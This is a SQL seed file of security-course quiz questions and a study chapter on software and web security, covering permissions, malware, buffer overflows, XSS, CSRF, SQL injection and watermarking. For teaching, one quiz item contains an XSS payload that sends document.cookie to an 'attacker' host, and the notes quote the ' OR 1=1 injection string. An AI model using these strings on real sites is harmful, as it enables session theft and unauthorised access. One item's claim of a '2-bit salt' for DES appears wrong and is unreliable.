INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Linux password encryption method uses a 2-bit salt and encrypts a 64-bit string using a 56-bit key?', '["SHA-1","MD5","Blowfish","DES"]', 3, 'DES.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Linux logging file specifically stores kernel events, errors, and warnings?', '["/etc/shadow","/var/log/auth.log","/var/log/kern.log","/etc/passwd"]', 2, '`/var/log/kern.log`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What are the three primary design goals of UNIX (which took priority over security)?', '["Confidentiality, integrity, availability","Authentication, authorisation, auditing","Security, speed, simplicity","Modularity, portability, efficiency"]', 3, 'Modularity, portability, and efficiency.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Name three security features that are explicitly listed as "missing" in standard UNIX.', '["SUID, sticky bit, umask","Firewalls, IDS, VPNs","SID, DACL, SACL","Any three of: ACLs, Data labeling, Mandatory access control, Capabilities, Standardized auditing"]', 3, 'Any three of: ACLs in general, Data labeling, Mandatory access control, Capabilities, Standardized auditing.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What Windows 10 security enhancement protects user credentials using hardware-based virtualization/isolation?', '["Trusted Boot","Device Guard","Credential Guard","Windows Hello"]', 2, 'Credential Guard.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What Windows Access Right allows a user to change an object''s DACL?', '["WRITE_DAC","SeShutdownPrivilege","GENERIC_READ","WRITE_OWNER"]', 0, '`WRITE_DAC`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'A Linux user creates a new file. The system''s default permission for files is 666. If the administrator has set the system''s `umask` to `033`, what will the final octal permission of the newly created file be?', '["755","666","633","644"]', 3, 'The final octal permission will be `644`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'A developer writes a new program. The system''s default permission for programs is 777. If the `umask` is `027`, what will the final octal permission be, and what does this mean in plain English for the Owner, Group, and Others?', '["750: owner rwx, group r-x, others none","777: full access for everyone","640: owner rw-, group r--, others none","755: owner rwx, group r-x, others r-x"]', 0, 'The final octal permission will be `750`. This means the Owner has read/write/execute access, the Group has read and execute access, and Others have no access.');

INSERT INTO chapters (number, title, variant, content_md) VALUES (5, 'Software & Web Security', 'extended', '**1. Overview**
This chapter covers the critical vulnerabilities and protective measures at the application layer. It matters because it explores how malicious software (malware) and input validation failures (such as buffer overflows and SQL injection) can completely compromise system security. Furthermore, it details how stateless web protocols are exploited via cross-site scripting (XSS) and cross-site request forging (XSRF), and concludes with how digital watermarking is utilised to protect copyright and verify the integrity of digital media. Understanding these concepts is essential for defending against the most prevalent application-level attacks.

**2. Key Terms**
*   **Malicious Software (Malware):** Program code executed without a user’s consent and carrying out harmful functionality [051 Slide 3/32].
*   **Virus:** Malware that copies itself to other files; needs a host file to propagate and execute [051 Slide 14/32].
*   **Worm:** Malware that exploits vulnerabilities present and can spread over the network independently [051 Slide 14/32].
*   **Trojan:** A deceptive program that spoofs a harmless or useful program but actually stores other malware [051 Slide 14/32].
*   **Rootkit:** A set of programs that alter OS functionality to mask malicious processes and ensure privileged remote access [051 Slides 12/32, 14/32].
*   **Buffer Overflow:** A vulnerability where, without proper bound checking, buffer content overspills into the adjacent upper stack area, allowing an attacker to overwrite the return address and hijack the execution flow [051 Slide 21/32].
*   **Code Injection:** Tricking a program into executing an attacker''s code by clever input construction that mixes code and data [051 Slide 26/32].
*   **Cross-Site Scripting (XSS):** A vulnerability found in any web application that returns user input without filtering, allowing the execution of arbitrary Javascript in a user''s browser [052 Slide 13/24].
*   **Cross-Site Request Forging (XSRF):** An attack where a browser sends a forged user request including the existing authorisation credentials (like session cookies) to a server [052 Slide 16/24].
*   **Digital Watermark:** A digital signal or pattern inserted into a digital document that carries information unique to the copyright owner, creator, or authorised consumer [053 Slide 4/27].
*   **Spatial Watermarking:** Applying a watermark by changing some of the pixel values in the lower bit plane (LSB) [053 Slide 18/27].
*   **Frequency Domain Watermarking:** Converting an image to the frequency domain and applying the watermark in low frequency, redundant data areas [053 Slide 18/27].

**3. Processes & Models**

**Malware Incident Handling Steps**
1. Preparation (Steady State)
2. Identification (Declare an Incident)
3. Containment 
4. Eradication (Start Clean-Up)
5. Recovery (Finish Clean-Up, Back in Production)
6. Lessons Learned

**Stack Buffer Overflow Hijacking Sequence**
1. A local buffer is allocated “bottom-up” (from lower to higher stack locations).
2. Without proper bound checking, buffer content overspills into the adjacent upper stack area.
3. An attacker overwrites the return address with an arbitrary value.
4. The execution flow is hijacked.

**XSS Attack Sequence**
1. The attacker uses a website''s form to insert a malicious string into the database.
2. The victim requests a page from the website.
3. The website includes the malicious string from the database in the response and sends it to the victim.
4. The victim''s browser executes the malicious script inside the response, sending the victim''s cookies to the attacker''s server.

**Algorithm & Transformation Checksum Watermarking**
1. Locations of the pixels that are to contain one bit each of the checksum are randomly chosen.
2. A watermark is formed from the 7 most significant bits of each pixel.
3. Eight 7-bit segments are concatenated, and the final checksum (via hash function) is 56-bit.
4. The last bit of each pixel is then changed to the corresponding checksum bit.

**4. Most Examinable Points**
*   **You must know** that the primary source of software insecurity is the failure to validate user input (Input Cleansing and Validation).
*   **You must know** the difference between a Virus (needs a host file to propagate) and a Worm (exploits vulnerabilities to spread independently).
*   **You must know** that a stack frame comprises four elements: function arguments, return address, frame pointer, and local variables.
*   **You must know** the three defensive mechanisms against stack exploits: Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries (checking a special value before following the return).
*   **You must know** the difference between HTTP GET (parameters in URI, safe/no side-effects) and HTTP POST (parameters in body, potential side-effects).
*   **You must know** that SQL Injection bypasses password checks using strings like `'' OR 1=1` because it makes the SQL `WHERE` clause always evaluate to true.
*   **You must know** the three SQL injection defence mechanisms: Validate/Sanitise Input, Parameterised Input, and SQL Escape.
*   **You must know** the difference between Encryption (transforms document to be unreadable without a key) and Watermarking (leaves the original file intact and recognisable).
*   **You must know** the five applications of digital watermarking: Ownership Assertion, Fingerprinting/Content Protection, Authentication & integrity verification, Content labeling, and Usage control & Copy protection.
*   **You must know** the five characteristics of a good watermark: Unobtrusive, Readily Detectable, Unambiguous, Innumerable, and Robust.
*   **You must know** the three text watermarking techniques: Text Line Coding (spacing between lines), Word-shift Coding (spacing between words), and Character/Typeface Encoding (altering shapes of characters).
*   **You must know** that a Jitter attack tweaks lower-order bits and adds jitter by splitting the signal into chunks and duplicating or deleting them at random to destroy the watermark.
*   **You must know** that a StirMark attack applies minor geometric distortions like stretching, shearing, shifting, and rotation to distort the watermark.

**5. Common Mistakes**
*   **Confusing Viruses and Worms:** Students frequently mix these up. Remember: a virus *requires a host file* and user interaction to spread. A worm exploits vulnerabilities to spread *independently* across a network.
*   **Misunderstanding XSS vs. Cross-Site Request Forging:** XSS involves injecting malicious *scripts* that execute inside the victim''s browser. Request Forging involves forging a *request* from a victim''s browser to exploit their existing authenticated session (e.g., an active banking login).
*   **Assuming Encryption and Watermarking are the same:** Encryption transforms a document to make it unreadable without a decryption key. Watermarking leaves the original file intact and readable, merely hiding a copyright or integrity marker within it.
*   **Thinking LSB Checksum Watermarking is robust:** Students sometimes assume LSB checksums are highly secure. In reality, it is extremely fragile; the verification fails with any change, it cannot survive lossy compression, and a forger can remove the entire watermark by dropping the LSB plane.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Define "Malware" according to the slides.', '["Software with a graphical interface","A legally licensed application","Program code executed without a user''s consent that carries out harmful functionality","Any program that accesses the network"]', 2, 'Program code executed without a user''s consent and carrying out harmful functionality.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the fundamental difference between a Virus and a Worm?', '["A Virus needs a host file to propagate; a Worm spreads independently over a network","A Virus spreads independently; a Worm needs a host file","They are the same thing","A Virus targets hardware; a Worm targets software"]', 0, 'A Virus requires a host file to propagate and execute, whereas a Worm exploits vulnerabilities to spread independently over a network.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the four components that make up a stack frame.', '["Function arguments, Return address, Frame pointer, Local variables","Heap, Stack, Registers, Cache","DEP, ASLR, Canary, Salt","Owner, Group, Others, Sticky"]', 0, 'Function arguments, Return address, Frame pointer, and Local variables.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the three security mechanisms that protect the stack against buffer overflow attacks.', '["DEP, SQL escaping, input filtering","Data Execution Protection, Address Space Layout Randomisation, Canaries","Firewalls, VPNs, IDS","Encryption, Hashing, Salting"]', 1, 'Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'In web security, what does an XSRF (Cross-Site Request Forging) attack exploit?', '["An unfiltered script reflected to the browser","An existing authenticated session, by tricking the browser into sending a forged request","A buffer overflow in the login form","A weak password hash"]', 1, 'It exploits an existing authenticated session (like an active session cookie) by tricking the browser into sending a forged request.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the difference between GET and POST HTTP methods?', '["GET sends data in the body; POST in the URI","GET has side-effects; POST is safe","GET puts parameters in the URI (no side-effects); POST puts them in the body (potential side-effects)","They are identical"]', 2, 'GET retrieves a resource (parameters in URI, safe/no side-effects), whereas POST sends data to a server (parameters in body, potential side-effects).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the three defence mechanisms against SQL Injection.', '["Firewall, IDS, VPN","DEP, ASLR, Canaries","Validate/Sanitise Input, Parameterised Input, SQL Escape","Encryption, Hashing, Salting"]', 2, 'Validate/Sanitise Input, Parameterised Input, and SQL Escape.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the main difference between encryption and digital watermarking?', '["Both make the document unreadable","Watermarking needs a key; encryption does not","Encryption hides a marker inside the file","Encryption makes a document unreadable without a key; watermarking leaves it intact and recognisable"]', 3, 'Encryption transforms a document to make it unreadable without a key, whereas watermarking leaves the original document intact and recognisable.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the five characteristics (requirements) of a good digital watermark.', '["Unobtrusive, Readily Detectable, Unambiguous, Innumerable, Robust","Spatial, Frequency, Text, Audio, Video","Fast, Cheap, Small, Visible, Editable","Encrypted, Compressed, Signed, Hashed, Salted"]', 0, 'Unobtrusive, Readily Detectable, Unambiguous, Innumerable, and Robust.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What are the three techniques used for Text Watermarking?', '["Jitter, StirMark, Cropping","DEP, ASLR, Canaries","LSB, MSB, Frequency shifting","Text Line Coding, Word-shift Coding, Character/Typeface Encoding"]', 3, 'Text Line Coding, Word-shift Coding, and Character/Typeface Encoding.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the difference between Spatial and Frequency Domain watermarking?', '["Both edit the same pixel bits","Spatial changes pixel LSBs; Frequency Domain applies the watermark in low-frequency redundant areas","Spatial uses frequency transforms; Frequency Domain edits pixels","Spatial is robust; Frequency is fragile"]', 1, 'Spatial watermarking changes pixel values in the lower bit plane (LSB), whereas Frequency Domain watermarking converts the image and applies the watermark in low frequency redundant data areas.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'How does a SQL injection attack bypass a password check using the string `'' OR 1=1`?', '["It overflows the login buffer","It deletes the password table","It makes the WHERE clause always true (1=1), granting access even with an empty password","It encrypts the query"]', 2, 'It modifies the SQL query so that the password check evaluates to true (since `1=1` is always true), permitting access even if the password field is empty.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name three applications of digital watermarking.', '["GET, POST, PUT","Virus, Worm, Trojan","DEP, ASLR, Canaries","Any three of: Ownership Assertion, Fingerprinting, Authentication, Content labeling, Usage control"]', 3, 'Any three of: Ownership Assertion, Fingerprinting/Content Protection, Authentication & integrity verification, Content labeling, Usage control & Copy protection.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What specific stack frame component does a buffer overflow attacker target to hijack the execution flow?', '["The frame pointer","The heap","The function arguments","The return address"]', 3, 'The return address.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What are the six steps of Malware Incident Handling?', '["Prevention, Detection, Recovery","Scan, Patch, Monitor, Report, Audit, Close","Detect, Analyse, Contain, Erase, Restore, Review","Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned"]', 3, 'Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What does a StirMark attack simulate by applying geometric distortions (stretching, shearing, shifting, rotation)?', '["Lossy compression","An LSB plane removal","The printing/scanning process","A network flooding attack"]', 2, 'It simulates the printing/scanning process.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What specifically does a "Canary" do to protect the stack?', '["It randomises the stack layout","It precedes the return value with a special value and checks if it changed after the call","It marks the stack non-executable","It encrypts the return address"]', 1, 'It precedes the return value with a special value, checking if the content has changed after the call to prevent execution if altered.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the mechanism of a "Jitter attack" in the context of digital watermarking?', '["It splits the signal into chunks and duplicates or deletes them at random, tweaking lower-order bits","It floods the watermark detector","It encrypts the watermark bits","It applies geometric stretching and rotation"]', 0, 'It splits the signal into chunks and tweaks the lower-order bits by duplicating or deleting chunks at random.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Your company''s web application returns user input without filtering. An attacker submits a form containing `<script>window.location=''http://attacker/?cookie=''+document.cookie</script>`. When an innocent user views the page, their browser executes this. What specific type of attack is this?', '["Cross-Site Request Forging (XSRF)","Cross-Site Scripting (XSS)","Buffer Overflow","SQL Injection"]', 1, 'Cross-Site Scripting (XSS).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'An attacker inputs a string longer than 128 bytes into a vulnerable C function `strcpy(buf, str)`. The buffer overspills into the adjacent upper stack area. What type of vulnerability is this, and what is the primary defensive mechanism that randomises the stack memory allocation to prevent it?', '["SQL Injection; defended by parameterised input","CSRF; defended by anti-forgery tokens","XSS; defended by input filtering","Buffer Overflow; defended by Address Space Layout Randomisation (ASLR)"]', 3, 'This is a Buffer Overflow. The defensive mechanism is Address Space Layout Randomisation (ASLR).');

COMMIT;
